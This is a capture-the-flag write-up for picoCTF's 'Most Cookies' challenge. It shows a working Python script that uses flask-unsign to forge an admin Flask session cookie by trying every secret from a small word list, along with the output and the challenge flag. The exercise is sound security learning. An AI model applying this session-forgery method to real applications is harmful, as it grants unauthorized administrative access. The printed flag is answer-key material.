# Challenge: Most Cookies
- Category: Web

## Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:65344/
## Files and Setup
`[https://jupiter.challenges.picoctf.org/problem/37821/](http://mercury.picoctf.net:65344/)`

## Flag: 
`picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}`

## Solution
The webpage looked like this

<img width="1040" height="693" alt="image" src="https://github.com/user-attachments/assets/465d9d80-e8f4-4fb6-8a59-c9019f928dd7" />

Upon checking `server.py`, i saw `cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]`
when i entered any cookie name (eg. sugar) all i would get was

<img width="1027" height="537" alt="image" src="https://github.com/user-attachments/assets/a9302e1c-3ed2-4637-b3be-4e558571a340" />

So i began looking through the server script more and found that the cookie name was being randomised `app.secret_key = random.choice(cookie_names)`

and this block 
```
if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
``` 
make it clear that the cookie needed to begin with {'very_auth':'admin} 
Looking up documentation on flask cookies, i found an exploit to unsign flask cookies using subprocesses, i made this script

```
import subprocess
import requests

def sign_cookie_with_secrets(secrets, cookie_data="{'very_auth': 'admin'}"):
    out = {}
    for s in secrets:
        try:
            r = subprocess.run(
                ['flask-unsign', '--sign', '--cookie', cookie_data, '--secret', s],
                capture_output=True, text=True, check=True
            )
            out[s] = r.stdout.strip()
        except subprocess.CalledProcessError as e:
            out[s] = f"Error: {e.stderr.strip()}"
    return out

def check_cookies_for_flag(signed):
    url = 'http://mercury.picoctf.net:65344/display'
    for secret, cookie in signed.items():
        try:
            if not isinstance(cookie, str) or cookie.startswith("Error:"):
                continue
            resp = requests.get(url, cookies={'session': cookie}, allow_redirects=False, timeout=10)
            if resp.status_code in (301, 302, 303, 307, 308):
                continue
            if 'picoCTF' in resp.text:
                print(f"Secret: {secret}\nSigned Cookie: {cookie}\nResponse Text: {resp.text}\n")
                return True
        except Exception as e:
            print(f"Error with secret '{secret}': {e}")
    return False

if __name__ == "__main__":
    secrets = [
        "snickerdoodle","chocolate chip","oatmeal raisin","gingersnap","shortbread",
        "peanut butter","whoopie pie","sugar","molasses","kiss","biscotti","butter",
        "spritz","snowball","drop","thumbprint","pinwheel","wafer","macaroon",
        "fortune","crinkle","icebox","gingerbread","tassie","lebkuchen","macaron",
        "black and white","white chocolate macadamia"
    ]
    signed = sign_cookie_with_secrets(secrets)
    check_cookies_for_flag(signed)

```

Running this script gave me the following output 

```
PS C:\Users\advay\Desktop\cryptonite\webex> py solve.py
Secret: fortune
Signed Cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aOQIvg.M_TMB0qZxqnLSznHaB2UtzvOJgU
Response Text: <!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>

```

## References
- https://www.bordergate.co.uk/flask-session-cookies/
- https://www.piwheels.org/project/flask-unsign/
